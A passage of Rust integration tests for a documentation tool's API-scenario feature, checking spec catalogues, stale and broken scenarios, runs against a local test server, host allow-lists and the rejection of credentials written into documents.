    let pin = repo.head().unwrap();
    // Reopen so the freshly committed config is the one in force.
    let mut dit = Dit::open(path).unwrap();
    dit.reindex(ReindexMode::All).unwrap();
    (dit, pin)
}

#[test]
fn a_registered_spec_becomes_a_catalogue_without_being_copied() {
    let tmp = tempfile::tempdir().unwrap();
    let (dit, _) = morse_workspace(tmp.path());

    let report = dit.morse_report().unwrap();
    assert_eq!(report.specs.len(), 1);
    let spec = &report.specs[0];
    assert_eq!(spec.id, "auth");
    assert_eq!(spec.title.as_deref(), Some("Acme Auth"));
    assert_eq!(spec.problem, None);
    assert_eq!(
        spec.operations
            .iter()
            .map(|o| o.operation_id.as_str())
            .collect::<Vec<_>>(),
        vec!["getCurrentUser", "loginUser", "createUser"],
        "ordered by path then method, which is how a person reads a catalogue"
    );

    // I5: the catalogue exists only in the index. Nothing was written back.
    assert!(
        !tmp.path().join(".dit/morse").exists(),
        "endpoints are derived from the document, never copied into a DIT file"
    );
}

#[test]
fn a_scenario_pinned_to_the_current_spec_is_fresh() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );

    let report = dit.morse_report().unwrap();
    assert_eq!(report.scenarios.len(), 1);
    let s = &report.scenarios[0];
    assert_eq!(s.scenario, "register");
    assert_eq!(s.path, "docs/api/register.md");
    assert_eq!(s.line, 3, "the fence's opening line, so an error can point");
    assert_eq!(s.steps, vec!["create", "login", "me"]);
    assert_eq!(s.requires, vec!["email", "password"]);
    assert_eq!(s.health, dit_core::ScenarioHealth::Fresh);
    assert!(report.is_clean());
}

#[test]
fn moving_the_spec_makes_every_scenario_pinned_to_it_stale() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    assert_eq!(
        dit.morse_report().unwrap().scenarios[0].health,
        dit_core::ScenarioHealth::Fresh
    );

    // The API gains an endpoint — two commits touching the document.
    let repo = Repo::open(tmp.path()).unwrap();
    for (n, extra) in [
        (1, "  /a:\n    get:\n      operationId: a\n"),
        (2, "  /b:\n    get:\n      operationId: b\n"),
    ] {
        let text = format!(
            "{}{extra}",
            std::fs::read_to_string(tmp.path().join("api/openapi.yaml")).unwrap()
        );
        std::fs::write(tmp.path().join("api/openapi.yaml"), text).unwrap();
        repo.add(".").unwrap();
        repo.commit(&format!("extend the API, part {n}")).unwrap();
    }
    dit.reindex(ReindexMode::All).unwrap();

    let report = dit.morse_report().unwrap();
    assert_eq!(
        report.scenarios[0].health,
        dit_core::ScenarioHealth::Stale { commits: 2 },
        "the count is what makes the report actionable, not just the flag"
    );
    assert!(
        report.is_clean(),
        "stale is a fact about the world, not a failure"
    );
    assert_eq!(
        report.specs[0].operations.len(),
        5,
        "and the catalogue followed the document without anyone re-importing"
    );
}

#[test]
fn an_operation_the_spec_dropped_makes_the_scenario_broken_by_name() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );

    // `loginUser` is renamed, which is what actually happens to APIs.
    let repo = Repo::open(tmp.path()).unwrap();
    std::fs::write(
        tmp.path().join("api/openapi.yaml"),
        SPEC_V1.replace("operationId: loginUser", "operationId: startSession"),
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("rename the login operation").unwrap();
    dit.reindex(ReindexMode::All).unwrap();

    let report = dit.morse_report().unwrap();
    match &report.scenarios[0].health {
        dit_core::ScenarioHealth::Broken { reasons } => {
            assert_eq!(reasons.len(), 1, "{reasons:?}");
            assert!(reasons[0].contains("login"), "{}", reasons[0]);
            assert!(reasons[0].contains("auth/loginUser"), "{}", reasons[0]);
        }
        other => panic!("expected broken, got {other:?}"),
    }
    assert!(!report.is_clean(), "a check command has to fail on this");
}

#[test]
fn a_chain_that_reads_a_value_before_it_is_captured_is_reported_as_broken() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    let out_of_order = format!(
        "```dit-morse\nscenario: backwards\nspec: {{ id: auth, commit: {pin} }}\nsteps:\n  - id: me\n    operation: auth/getCurrentUser\n    headers: {{ Authorization: \"Bearer {{{{token}}}}\" }}\n  - id: login\n    operation: auth/loginUser\n    capture: {{ token: $.token }}\n```\n"
    );
    write_doc(&mut dit, "docs/api/backwards.md", &out_of_order);

    let report = dit.morse_report().unwrap();
    match &report.scenarios[0].health {
        dit_core::ScenarioHealth::Broken { reasons } => {
            assert!(
                reasons[0].contains("wrong order"),
                "the fix is reordering, not adding a variable: {}",
                reasons[0]
            );
        }
        other => panic!("expected broken, got {other:?}"),
    }
}

#[test]
fn a_fence_that_does_not_parse_still_says_which_document_and_line() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/broken.md",
        "# Notes\n\nsome prose\n\n```dit-morse\nscenario: half-written\nspec: { id: auth }\n```\n",
    );

    let report = dit.morse_report().unwrap();
    assert_eq!(report.scenarios.len(), 1);
    let s = &report.scenarios[0];
    assert_eq!(s.scenario, "half-written");
    assert_eq!(s.path, "docs/api/broken.md");
    assert_eq!(s.line, 5);
    assert!(matches!(
        s.health,
        dit_core::ScenarioHealth::Unreadable { .. }
    ));
    assert!(!report.is_clean());
}

#[test]
fn a_scenario_naming_an_unregistered_spec_says_so_rather_than_vanishing() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/other.md",
        "```dit-morse\nscenario: elsewhere\nspec: { id: billing, commit: abc1234 }\nsteps:\n  - id: s\n    operation: billing/charge\n```\n",
    );

    let report = dit.morse_report().unwrap();
    match &report.scenarios[0].health {
        dit_core::ScenarioHealth::Broken { reasons } => {
            assert!(
                reasons.iter().any(|r| r.contains("not registered")),
                "{reasons:?}"
            );
        }
        other => panic!("expected broken, got {other:?}"),
    }
}

#[test]
fn a_spec_registered_but_missing_is_reported_instead_of_failing_the_reindex() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    std::fs::create_dir_all(tmp.path().join(".dit")).unwrap();
    std::fs::write(
        tmp.path().join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\nspecs:\n  - { id: auth, path: api/gone.yaml }\n",
    )
    .unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add(".").unwrap();
    repo.commit("register a spec that is not there").unwrap();

    let mut dit = Dit::open(tmp.path()).unwrap();
    dit.reindex(ReindexMode::All)
        .expect("one unreadable spec must not cost the workspace its reindex");
    let report = dit.morse_report().unwrap();
    assert_eq!(report.specs.len(), 1);
    assert!(report.specs[0]
        .problem
        .as_deref()
        .is_some_and(|p| p.contains("api/gone.yaml")));
    assert!(!report.is_clean());
}

#[test]
fn an_endpoint_no_document_describes_can_still_be_part_of_a_chain() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    let with_inline = format!(
        "```dit-morse\nscenario: legacy\nspec: {{ id: auth, commit: {pin} }}\nrequests:\n  - {{ id: legacyPing, method: get, path: /internal/ping, summary: Undocumented }}\nsteps:\n  - id: ping\n    request: legacyPing\n    expect: {{ status: 200 }}\n  - id: me\n    operation: auth/getCurrentUser\n```\n"
    );
    write_doc(&mut dit, "docs/api/legacy.md", &with_inline);

    let report = dit.morse_report().unwrap();
    let s = report
        .scenarios
        .iter()
        .find(|s| s.scenario == "legacy")
        .unwrap();
    assert_eq!(
        s.health,
        dit_core::ScenarioHealth::Fresh,
        "an inline request has no catalogue to be missing from — only the \
         operation step is checked against the spec"
    );
    assert_eq!(s.steps, vec!["ping", "me"]);
    assert!(report.is_clean());
}

#[test]
fn doctor_refuses_to_let_a_credential_sit_in_a_fence() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    let leaky = format!(
        "```dit-morse\nscenario: leaky\nspec: {{ id: auth, commit: {pin} }}\nsteps:\n  - id: me\n    operation: auth/getCurrentUser\n    headers: {{ Authorization: \"Bearer eyJhbGciOiJIUzI1NiJ9.abc.def\" }}\n```\n"
    );
    write_doc(&mut dit, "docs/api/leaky.md", &leaky);

    let found = dit
        .doctor()
        .into_iter()
        .find(|d| d.code == "morse-secrets")
        .expect("doctor must have something to say about this");
    assert_eq!(found.level, DiagnosticLevel::Error);
    assert!(
        found.message.contains("docs/api/leaky.md"),
        "{}",
        found.message
    );
    assert!(found.message.contains("Authorization"), "{}", found.message);

    // And the shape the design asks for passes silently.
    let proper = format!(
        "```dit-morse\nscenario: proper\nspec: {{ id: auth, commit: {pin} }}\nrequires: [token]\nsteps:\n  - id: me\n    operation: auth/getCurrentUser\n    headers: {{ Authorization: \"Bearer {{{{token}}}}\" }}\n```\n"
    );
    write_doc(&mut dit, "docs/api/leaky.md", &proper);
    let found = dit
        .doctor()
        .into_iter()
        .find(|d| d.code == "morse-secrets")
        .unwrap();
    assert_eq!(found.level, DiagnosticLevel::Ok, "{}", found.message);
}

#[test]
fn init_gitignores_the_morse_environment_file_before_it_can_exist() {
    let tmp = tempfile::tempdir().unwrap();
    let driver = tmp.path().join("dit-bin");
    std::fs::write(&driver, "").unwrap();
    let dit = Dit::init(&tmp.path().join("ws"), &driver).unwrap();

    let ignore = std::fs::read_to_string(dit.root().join(".gitignore")).unwrap();
    assert!(
        ignore
            .lines()
            .any(|l| l.trim() == dit_core::MORSE_LOCAL_PATH),
        "a secret that reaches git history cannot be taken back: {ignore}"
    );

    // A file that exists but is not ignored is an error, not a warning.
    std::fs::write(dit.root().join(".gitignore"), ".dit-cache/\n").unwrap();
    std::fs::write(dit.root().join(dit_core::MORSE_LOCAL_PATH), "envs: {}\n").unwrap();
    let found = dit
        .doctor()
        .into_iter()
        .find(|d| d.code == "morse-env")
        .expect("doctor must notice");
    assert_eq!(found.level, DiagnosticLevel::Error, "{}", found.message);
}

// ---- Morse 2: running, and the pin that only a green run may move ----------

/// A server that answers each connection with the next canned response.
/// Real sockets rather than a stub: what is under test is whether the whole
/// path — index, spec, local config, runner — reaches a server at all.
fn serve(responses: Vec<(u16, &'static str)>) -> u16 {
    use std::io::{BufRead, BufReader, Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for (index, stream) in listener.incoming().enumerate() {
            let Ok(mut stream) = stream else { break };
            {
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut line = String::new();
                reader.read_line(&mut line).unwrap();
                let mut len = 0usize;
                loop {
                    let mut header = String::new();
                    reader.read_line(&mut header).unwrap();
                    let header = header.trim_end();
                    if header.is_empty() {
                        break;
                    }
                    if let Some(v) = header.to_ascii_lowercase().strip_prefix("content-length:") {
                        len = v.trim().parse().unwrap_or(0);
                    }
                }
                if len > 0 {
                    let mut body = vec![0u8; len];
                    reader.read_exact(&mut body).unwrap();
                }
            }
            let (status, body) = responses.get(index).copied().unwrap_or((500, "{}"));
            let response = format!(
                "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\n\
                 Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
            if index + 1 >= responses.len() {
                break;
            }
        }
    });
    port
}

/// Point the workspace's `local` environment at a port, and allow it.
fn point_at(root: &Path, port: u16) {
    std::fs::write(
        root.join(dit_core::MORSE_LOCAL_PATH),
        format!(
            "envs:\n  local:\n    server: \"http://127.0.0.1:{port}\"\n    vars:\n      email: \"dev@acme.test\"\n      password: \"hunter2\"\nallow_hosts:\n  - 127.0.0.1\n"
        ),
    )
    .unwrap();
}

#[test]
fn a_run_reaches_the_server_the_environment_points_at_and_carries_values_along() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![
        (201, r#"{"data":{"id":"u_7"}}"#),
        (200, r#"{"token":"t0k"}"#),
        (200, r#"{"id":"u_7"}"#),
    ]);
    point_at(tmp.path(), port);

    let outcome = dit.morse_run("register", None).unwrap();
    assert!(outcome.passed(), "{outcome:#?}");
    assert_eq!(outcome.steps.len(), 3);
    assert!(
        outcome.steps[2].url.ends_with("/me"),
        "the path came from the spec, not from the fence: {}",
        outcome.steps[2].url
    );
}

#[test]
fn a_green_run_moves_the_pin_and_the_scenario_reads_fresh_again() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    // The spec moves, so the scenario goes stale.
    let repo = Repo::open(tmp.path()).unwrap();
    std::fs::write(
        tmp.path().join("api/openapi.yaml"),
        format!("{SPEC_V1}  /health:\n    get:\n      operationId: health\n"),
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("add a health endpoint").unwrap();
    dit.reindex(ReindexMode::All).unwrap();
    assert!(matches!(
        dit.morse_report().unwrap().scenarios[0].health,
        dit_core::ScenarioHealth::Stale { .. }
    ));

    let port = serve(vec![
        (201, r#"{"data":{"id":"u_7"}}"#),
        (200, r#"{"token":"t0k"}"#),
        (200, r#"{"id":"u_7"}"#),
    ]);
    point_at(tmp.path(), port);

    let head = repo.head().unwrap();
    let synced = dit.morse_sync("register", None, "farid").unwrap();
    assert!(synced.run.passed());
    assert_eq!(synced.moved_to.as_deref(), Some(head.as_str()));

    dit.reindex(ReindexMode::All).unwrap();
    let report = dit.morse_report().unwrap();
    assert_eq!(
        report.scenarios[0].health,
        dit_core::ScenarioHealth::Fresh,
        "the pin now says this was proven against the spec as it stands"
    );
    // And only the pin moved: the document a person wrote is otherwise intact.
    let body = dit.read_doc("docs/api/register.md").unwrap();
    assert!(body.contains("# Register"), "{body}");
    assert!(body.contains("requires: [email, password]"), "{body}");
    assert!(body.contains(&format!("commit: {head}")), "{body}");
}

#[test]
fn a_red_run_leaves_the_pin_exactly_where_it_was() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![(500, r#"{"error":"boom"}"#)]);
    point_at(tmp.path(), port);

    let synced = dit.morse_sync("register", None, "farid").unwrap();
    assert!(!synced.run.passed());
    assert_eq!(
        synced.moved_to, None,
        "a pin that advanced on a red run would be a claim nobody made"
    );
    let body = dit.read_doc("docs/api/register.md").unwrap();
    assert!(body.contains(&format!("commit: {pin}")), "{body}");
}

#[test]
fn a_host_this_machine_never_allowed_stops_the_run_and_names_the_way_out() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let port = serve(vec![(200, "{}")]);
    // An environment that points somewhere but allows nothing — what a fresh
    // clone of someone else's scenario looks like.
    std::fs::write(
        tmp.path().join(dit_core::MORSE_LOCAL_PATH),
        format!("envs:\n  local:\n    server: \"http://127.0.0.1:{port}\"\n    vars:\n      email: a\n      password: b\n"),
    )
    .unwrap();

    let outcome = dit.morse_run("register", None).unwrap();
    assert!(!outcome.passed());
    assert!(outcome.steps.is_empty(), "nothing was attempted");
    let refused = outcome.refused.unwrap();
    assert!(refused.contains("dit morse allow 127.0.0.1"), "{refused}");
}

#[test]
fn a_spec_declaring_a_relative_server_says_what_to_do_about_it() {
    // Generated specs very often say `servers: - url: /` — "wherever this is
    // deployed". Real workspaces are full of them, and failing later as a
    // malformed URL sends the reader looking in the wrong place.
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    std::fs::create_dir_all(tmp.path().join("api")).unwrap();
    std::fs::write(
        tmp.path().join("api/openapi.yaml"),
        "openapi: 3.0.3\nservers:\n  - url: /\n    description: local\npaths:\n  /me:\n    get:\n      operationId: getCurrentUser\n",
    )
    .unwrap();
    std::fs::create_dir_all(tmp.path().join(".dit")).unwrap();
    std::fs::write(
        tmp.path().join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\nspecs:\n  - { id: auth, path: api/openapi.yaml }\n",
    )
    .unwrap();
    let repo = Repo::open(tmp.path()).unwrap();
    repo.add(".").unwrap();
    repo.commit("a spec with a relative server").unwrap();
    let pin = repo.head().unwrap();

    let mut dit = Dit::open(tmp.path()).unwrap();
    dit.reindex(ReindexMode::All).unwrap();
    write_doc(
        &mut dit,
        "docs/api/s.md",
        &format!("```dit-morse\nscenario: s\nspec: {{ id: auth, commit: {pin} }}\nenv: local\nsteps:\n  - id: me\n    operation: auth/getCurrentUser\n```\n"),
    );

    let err = dit.morse_run("s", None).unwrap_err().to_string();
    assert!(err.contains("relative"), "{err}");
    assert!(err.contains("morse.local.yaml"), "{err}");
    assert!(
        err.contains("server:"),
        "the message has to carry the fix: {err}"
    );
}

// ---- Path parameters (ADR 0023) --------------------------------------------

/// Add `GET /users/{id}` to the spec, commit it, and return the new pin.
fn spec_with_path_parameter(root: &Path, dit: &mut Dit) -> String {
    let repo = Repo::open(root).unwrap();
    std::fs::write(
        root.join("api/openapi.yaml"),
        format!("{SPEC_V1}  /users/{{id}}:\n    get:\n      operationId: getUser\n"),
    )
    .unwrap();
    repo.add(".").unwrap();
    repo.commit("describe fetching one user").unwrap();
    dit.reindex(ReindexMode::All).unwrap();
    repo.head().unwrap()
}

#[test]
fn a_step_that_leaves_a_path_parameter_unfilled_is_broken_before_anything_runs() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    let pin = spec_with_path_parameter(tmp.path(), &mut dit);
    write_doc(
        &mut dit,
        "docs/api/user.md",
        &format!(
            "```dit-morse\nscenario: fetch\nspec: {{ id: auth, commit: {pin} }}\nsteps:\n  - id: one\n    operation: auth/getUser\n```\n"
        ),
    );
    let report = dit.morse_report().unwrap();
    match &report.scenarios[0].health {
        dit_core::ScenarioHealth::Broken { reasons } => {
            assert_eq!(reasons.len(), 1, "{reasons:?}");
            assert!(
                reasons[0].contains("`id`") && reasons[0].contains("params:"),
                "names the parameter and the fix: {}",
                reasons[0]
            );
        }
        other => panic!("sending the literal `{{id}}` is a request nobody wrote; got {other:?}"),
    }
}

#[test]
fn a_path_parameter_reaches_the_server_through_the_whole_path() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    let pin = spec_with_path_parameter(tmp.path(), &mut dit);
    write_doc(
        &mut dit,
        "docs/api/user.md",
        &format!(
            "```dit-morse\nscenario: fetch\nspec: {{ id: auth, commit: {pin} }}\nenv: local\nrequires: [email, password]\nsteps:\n  - id: create\n    operation: auth/createUser\n    body: {{ email: \"{{{{email}}}}\" }}\n    capture: {{ user_id: $.data.id }}\n  - id: one\n    operation: auth/getUser\n    params: {{ id: \"{{{{user_id}}}}\" }}\n    expect: {{ status: 200 }}\n```\n"
        ),
    );
    assert_eq!(
        dit.morse_report().unwrap().scenarios[0].health,
        dit_core::ScenarioHealth::Fresh
    );
    let port = serve(vec![(201, r#"{"data":{"id":"u_7"}}"#), (200, "{}")]);
    point_at(tmp.path(), port);
    let outcome = dit.morse_run("fetch", None).unwrap();
    assert!(outcome.passed(), "{outcome:#?}");
    assert!(
        outcome.steps[1].url.ends_with("/users/u_7"),
        "the spec's `{{id}}` was filled from `params:`: {}",
        outcome.steps[1].url
    );
}

// ---- A scenario that crosses services (DESIGN.md §20.3) --------------------

#[test]
fn a_step_calling_another_spec_is_resolved_and_sent_against_that_spec() {
    // Register against `auth`, then subscribe against `billing`: each step
    // names its own spec, so each must be looked up in — and sent to the
    // server of — that spec, not the scenario's first one.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    let (_, _) = morse_workspace(root);
    let auth_port = serve(vec![(201, r#"{"data":{"id":"u_7"}}"#)]);
    let billing_port = serve(vec![(200, "{}")]);
    std::fs::write(
        root.join("api/openapi.yaml"),
        SPEC_V1.replace(
            "http://localhost:3000",
            &format!("http://127.0.0.1:{auth_port}"),
        ),
    )
    .unwrap();
    std::fs::write(
        root.join("api/billing.yaml"),
        format!(
            "openapi: 3.0.3\ninfo:\n  title: Acme Billing\n  version: \"1.0.0\"\nservers:\n  - url: \"http://127.0.0.1:{billing_port}\"\npaths:\n  /subscriptions:\n    post:\n      operationId: subscribe\n"
        ),
    )
    .unwrap();
    std::fs::write(
        root.join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\nspecs:\n  - { id: auth, path: api/openapi.yaml }\n  - { id: billing, path: api/billing.yaml }\n",
    )
    .unwrap();
    let repo = Repo::open(root).unwrap();
    repo.add(".").unwrap();
    repo.commit("register the billing spec").unwrap();
    let pin = repo.head().unwrap();
    let mut dit = Dit::open(root).unwrap();
    dit.reindex(ReindexMode::All).unwrap();
    std::fs::write(
        root.join(dit_core::MORSE_LOCAL_PATH),
        "allow_hosts:\n  - 127.0.0.1\n",
    )
    .unwrap();
    write_doc(
        &mut dit,
        "docs/api/subscribe.md",
        &format!(
            "```dit-morse\nscenario: subscribe\nspec: {{ id: auth, commit: {pin} }}\nsteps:\n  - id: create\n    operation: auth/createUser\n    expect: {{ status: 201 }}\n  - id: pay\n    operation: billing/subscribe\n    expect: {{ status: 200 }}\n```\n"
        ),
    );

    let outcome = dit.morse_run("subscribe", None).unwrap();
    assert!(outcome.passed(), "{outcome:#?}");
    assert!(
        outcome.steps[0]
            .url
            .starts_with(&format!("http://127.0.0.1:{auth_port}/")),
        "{}",
        outcome.steps[0].url
    );
    assert_eq!(
        outcome.steps[1].url,
        format!("http://127.0.0.1:{billing_port}/subscriptions"),
        "the billing step went to billing's server"
    );
}

// ---- The workbench: editing, creating and sending (ADR 0023) --------------

const WITH_PROSE: &str = "# Register\n\nWhy this chain exists, in a person's words.\n\n";

fn step_me_checking(value: &str) -> dit_model::MorseStep {
    dit_parse::parse_morse_scenario(&format!(
        "scenario: x\nspec: {{ id: auth, commit: y }}\nsteps:\n  - id: me\n    operation: auth/getCurrentUser\n    headers: {{ Authorization: \"Bearer {{{{token}}}}\" }}\n    expect:\n      status: 200\n      jsonpath:\n        $.name: \"{value}\"\n"
    ))
    .unwrap()
    .steps
    .remove(0)
}

#[test]
fn a_step_saved_from_the_screen_lands_in_its_fence_and_nothing_else_moves() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    let doc = format!(
        "{WITH_PROSE}{}\nAfterword.\n",
        SCENARIO
            .replace("PIN", &pin)
            .trim_start_matches("# Register\n\n")
    );
    write_doc(&mut dit, "docs/api/register.md", &doc);

    let detail = dit.morse_scenario("register").unwrap();
    assert!(detail.editable);
    assert_eq!(detail.scenario.steps.len(), 3);

    dit.morse_save_step("register", step_me_checking("Ada"), None, "farid")
        .unwrap();

    let body = dit.read_doc("docs/api/register.md").unwrap();
    assert!(
        body.starts_with(WITH_PROSE),
        "the prose above is untouched: {body}"
    );
    assert!(body.ends_with("```\n\nAfterword.\n"), "and below: {body}");
    let saved = dit.morse_scenario("register").unwrap().scenario;
    assert_eq!(
        saved.steps.len(),
        3,
        "an existing step is replaced, not added"
    );
    assert_eq!(saved.steps[2], step_me_checking("Ada"));
    assert_eq!(
        dit.morse_report().unwrap().scenarios[0].health,
        dit_core::ScenarioHealth::Fresh,
        "the index was brought up to date by the same write"
    );
}

#[test]
fn a_new_step_that_reads_a_new_name_adds_it_to_requires() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let mut extra = step_me_checking("Ada");
    extra.id = "again".into();
    extra.headers = vec![(
        "X-Api-Key".into(),
        dit_model::MorseValue::Str("{{api_key}}".into()),
    )];
    dit.morse_save_step("register", extra, None, "farid")
        .unwrap();
    let saved = dit.morse_scenario("register").unwrap().scenario;
    assert_eq!(saved.steps.last().unwrap().id, "again");
    assert_eq!(
        saved.requires,
        vec![
            "email".to_owned(),
            "password".to_owned(),
            "api_key".to_owned()
        ],
        "a new name is recorded as a name the environment must provide — never a value"
    );
}

#[test]
fn a_fence_with_a_comment_is_not_rewritten_from_the_screen() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO
            .replace("PIN", &pin)
            .replace("env: local\n", "env: local   # the dev box\n"),
    );
    assert!(!dit.morse_scenario("register").unwrap().editable);
    let err = dit
        .morse_save_step("register", step_me_checking("Ada"), None, "farid")
        .unwrap_err();
    assert!(err.to_string().contains("comment"), "{err}");
    assert!(
        dit.read_doc("docs/api/register.md")
            .unwrap()
            .contains("# the dev box"),
        "the person's words survive"
    );
}

#[test]
fn a_scenario_created_from_the_screen_is_pinned_where_the_spec_stands() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    write_doc(&mut dit, "docs/api/auth.md", "# Auth\n\nNotes.\n");
    // In this workspace the spec lives in the same repo, so HEAD is wherever
    // the last commit left it — and HEAD is what "pinned now" means.
    let pin = Repo::open(tmp.path()).unwrap().head().unwrap();
    let created = dit
        .morse_create_scenario(
            "docs/api/auth.md",
            "whoami",
            "auth",
            Some("local"),
            step_me_checking("Ada"),
            vec![],
            "farid",
        )
        .unwrap();
    assert_eq!(created.spec.commit, pin, "pinned at the spec's HEAD");
    assert_eq!(created.requires, vec!["token".to_owned()]);
    let body = dit.read_doc("docs/api/auth.md").unwrap();
    assert!(
        body.starts_with("# Auth\n\nNotes.\n\n```dit-morse\n"),
        "{body}"
    );
    let report = dit.morse_report().unwrap();
    assert_eq!(report.scenarios[0].scenario, "whoami");
    assert_eq!(report.scenarios[0].health, dit_core::ScenarioHealth::Fresh);

    let err = dit
        .morse_create_scenario(
            "docs/api/other.md",
            "whoami",
            "auth",
            None,
            step_me_checking("Ada"),
            vec![],
            "farid",
        )
        .unwrap_err();
    assert!(
        err.to_string().contains("already"),
        "names are unique: {err}"
    );
}

fn send_draft(op: &str, params: &[(&str, &str)]) -> dit_core::SendDraft {
    dit_core::SendDraft {
        target: dit_core::SendTarget::Operation(dit_model::OperationRef::parse(op).unwrap()),
        params: params
            .iter()
            .map(|(k, v)| ((*k).to_owned(), dit_model::MorseValue::Str((*v).to_owned())))
            .collect(),
        query: vec![],
        headers: vec![],
        body: None,
        expect: dit_model::Expect {
            status: Some(200),
            json: vec![],
        },
        capture: vec![],
    }
}

#[test]
fn one_operation_is_sent_through_the_same_gates_as_a_run() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    spec_with_path_parameter(tmp.path(), &mut dit);
    let port = serve(vec![(200, r#"{"id":"u_7"}"#)]);
    point_at(tmp.path(), port);

    let sent = dit
        .morse_send(&send_draft("auth/getUser", &[("id", "u_7")]), Some("local"))
        .unwrap();
    assert!(sent.passed(), "{sent:#?}");
    assert!(
        sent.steps[0].url.ends_with("/users/u_7"),
        "{}",
        sent.steps[0].url
    );

    let runs = dit.morse_runs().unwrap();
    assert_eq!(
        runs[0].key, "send:auth/getUser",
        "a send is kept like a run, in the index only"
    );
    assert!(runs[0].run.passed);

    // An operation the spec does not describe has no method or path to send.
    let err = dit
        .morse_send(&send_draft("auth/nowhere", &[]), Some("local"))
        .unwrap_err();
    assert!(err.to_string().contains("auth/nowhere"), "{err}");
}

#[test]
fn a_send_to_a_host_this_machine_does_not_allow_sends_nothing() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, _) = morse_workspace(tmp.path());
    std::fs::write(
        tmp.path().join(dit_core::MORSE_LOCAL_PATH),
        "envs:\n  local:\n    server: \"http://127.0.0.1:9\"\nallow_hosts: []\n",
    )
    .unwrap();
    let sent = dit
        .morse_send(&send_draft("auth/getCurrentUser", &[]), Some("local"))
        .unwrap();
    assert!(sent
        .refused
        .as_deref()
        .unwrap()
        .contains("dit morse allow 127.0.0.1"));
    assert!(sent.steps.is_empty(), "nothing was sent");
}

#[test]
fn environments_are_listed_by_name_and_never_by_value() {
    let tmp = tempfile::tempdir().unwrap();
    let (dit, _) = morse_workspace(tmp.path());
    point_at(tmp.path(), 4000);
    let envs = dit.morse_envs().unwrap();
    assert_eq!(envs.envs.len(), 1);
    assert_eq!(envs.envs[0].name, "local");
    assert_eq!(
        envs.envs[0].server.as_deref(),
        Some("http://127.0.0.1:4000")
    );
    assert_eq!(
        envs.envs[0].vars,
        vec!["email".to_owned(), "password".to_owned()]
    );
    assert_eq!(envs.allow_hosts, vec!["127.0.0.1".to_owned()]);
    assert!(
        !format!("{envs:?}").contains("hunter2"),
        "a value never leaves the local file through this"
    );
}

#[test]
fn a_credential_written_out_is_refused_before_it_can_reach_a_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let (mut dit, pin) = morse_workspace(tmp.path());
    write_doc(
        &mut dit,
        "docs/api/register.md",
        &SCENARIO.replace("PIN", &pin),
    );
    let mut leaky = step_me_checking("Ada");
    leaky.headers = vec![(
        "Authorization".into(),
        dit_model::MorseValue::Str("Bearer eyJhbGciOiJIUzI1NiJ9.abc.def".into()),
    )];
    let err = dit
